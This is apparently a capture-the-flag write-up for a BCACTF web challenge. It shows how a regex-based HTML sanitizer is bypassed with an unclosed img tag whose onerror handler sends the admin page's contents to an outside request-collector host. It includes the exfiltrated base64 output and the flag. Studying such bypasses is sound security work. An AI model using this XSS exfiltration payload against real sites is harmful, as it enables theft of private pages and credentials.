# Regular Website:webex:200pts
They said you couldn't [parse HTML with regex](https://stackoverflow.com/questions/1732348/regex-match-open-tags-except-xhtml-self-contained-tags/1732454#1732454). So that's exactly what I did!  
[package.json](package.json)  
[server.ts](server.ts)  
[http://webp.bcactf.com:49155/](http://webp.bcactf.com:49155/)  
  
Hint 1 of 1  
How is the site sanitizing your input?  

# Solution

When I accessed the site, the site was periodically blurred.
Just a Regular Website  
![site1.png](https://i.imgur.com/kF0YUdl.png)  
![site2.png](https://i.imgur.com/VllBdiA.png)  
You can post a comment and admin seems to see it.
When I read the distributed source, I was interested in the following of server.ts
```ts

    const sanitized = text.replace(/<[\s\S]*>/g, "XSS DETECTED!!!!!!");
    const page = await (await browser).newPage();
    await page.setJavaScriptEnabled(true);
    try {
        await page.setContent(`
        <!DOCTYPE html>
        <html>
            <head>
                <meta charset="utf-8">
                <title>Comment</title>
            </head>
            <body>
                <p>Welcome to the Regular Website admin panel.</p>
                <h2>Site Stats</h2>
                <p><strong>Comments:</strong> ???</p>
                <p><strong>Flag:</strong> ${flag}</p>
                <h2>Latest Comment</h2>
                ${sanitized}
            </body>
        </html>
        `, {timeout: 3000, waitUntil: "networkidle2"});
    } catch (e) {

```
I'm sanitizing XSS with a regular expression, but incomplete tags such as `<img src =" 1 "on error =" alert (1) "` are passed.
Since the flag is displayed on the admin panel, you can listen to document.body.innerHTML on an external server as shown below.  
```html
<img src="1" onerror="location.href='https://[RequestBin.com]/?s='+btoa(document.body.innerHTML)" 
```
Then you can get the following query. 
```
?s=CiAgICAgICAgICAgICAgICA8cD5XZWxjb21lIHRvIHRoZSBSZWd1bGFyIFdlYnNpdGUgYWRtaW4gcGFuZWwuPC9wPgogICAgICAgICAgICAgICAgPGgyPlNpdGUgU3RhdHM8L2gyPgogICAgICAgICAgICAgICAgPHA+PHN0cm9uZz5Db21tZW50czo8L3N0cm9uZz4gPz8/PC9wPgogICAgICAgICAgICAgICAgPHA+PHN0cm9uZz5GbGFnOjwvc3Ryb25nPiBiY2FjdGZ7aDNfYzBtZXNfVXI3NGhzaFJ9PC9wPgogICAgICAgICAgICAgICAgPGgyPkxhdGVzdCBDb21tZW50PC9oMj4KICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIxIiBvbmVycm9yPSJsb2NhdGlvbi5ocmVmPSdodHRwczovL2VuOWJmb2dld2Q3anMueC5waXBlZHJlYW0ubmV0Lz9zPScrYnRvYShkb2N1bWVudC5ib2R5LmlubmVySFRNTCkiIDw9IiIgYm9keT0iIj4KICAgICAgICAKICAgICAgICA=
```
When the contents are decoded with base64, it becomes as follows. 
```html
                <p>Welcome to the Regular Website admin panel.</p>
                <h2>Site Stats</h2>
                <p><strong>Comments:</strong> ???</p>
                <p><strong>Flag:</strong> bcactf{h3_c0mes_Ur74hshR}</p>
                <h2>Latest Comment</h2>
                <img src="1" onerror="location.href='https://en9bfogewd7js.x.pipedream.net/?s='+btoa(document.body.innerHTML)" <="" body="">
        
        
```
Flag was obtained

Flag: ```bcactf{h3_c0mes_Ur74hshR}```